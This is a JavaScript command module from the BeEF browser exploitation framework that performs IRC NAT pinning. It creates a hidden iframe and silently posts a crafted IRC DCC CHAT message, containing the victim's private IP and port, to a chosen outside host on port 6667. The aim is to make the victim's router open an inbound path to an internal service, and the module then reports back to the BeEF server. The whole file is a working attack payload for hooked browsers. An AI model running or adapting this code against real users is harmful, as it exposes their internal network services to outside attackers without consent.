//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var privateip = '<%= @privateip %>';
  var privateport = '<%= @privateport %>';
  var connectto = '<%= @connectto %>';

  function dot2dec(dot){
    var d = dot.split('.');
    return (((+d[0])*256+(+d[1]))*256+(+d[2]))*256+(+d[3]);
  }
 
  //send a request
  function send_msg(privateip,privateport,connectto){
    
    //create hidden iFrame
    var iframe = document.createElement("iframe");
    iframe.setAttribute("id","irc_nat_pinning_<%= @command_id %>");
    iframe.setAttribute("style", "visibility:hidden; width:1px; height: 1px;");
    document.body.appendChild(iframe);
    iframe = document.getElementById("irc_nat_pinning_<%= @command_id %>");


    //create form
    var action = connectto + ":6667/"
    var myform = document.createElement("form");
    myform.setAttribute("name", "data");
    myform.setAttribute("method", "post");
    myform.setAttribute("enctype", "multipart/form-data");
    myform.setAttribute("action", action);
    iframe.contentWindow.document.body.appendChild(myform);

    //create message, refer Samy Kamkar (http://samy.pl/natpin/)
    x = String.fromCharCode(1);
    var s = 'PRIVMSG beef :'+x+'DCC CHAT beef '+dot2dec(privateip)+' '+privateport+x+"\n";

    //create message textarea
    var myExt = document.createElement("textarea");
    myExt.setAttribute("id","msg_<%= @command_id %>");
    myExt.setAttribute("name","msg_<%= @command_id %>");
    myform.appendChild(myExt);

    //send message
    iframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = s;
    myform.submit(); 
    alert(s);
    
    //clean up
    setTimeout('document.body.removeChild(document.getElementById("irc_nat_pinning_<%= @command_id %>"));', 15000);
  } 

  send_msg(privateip,privateport,connectto);
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');

});
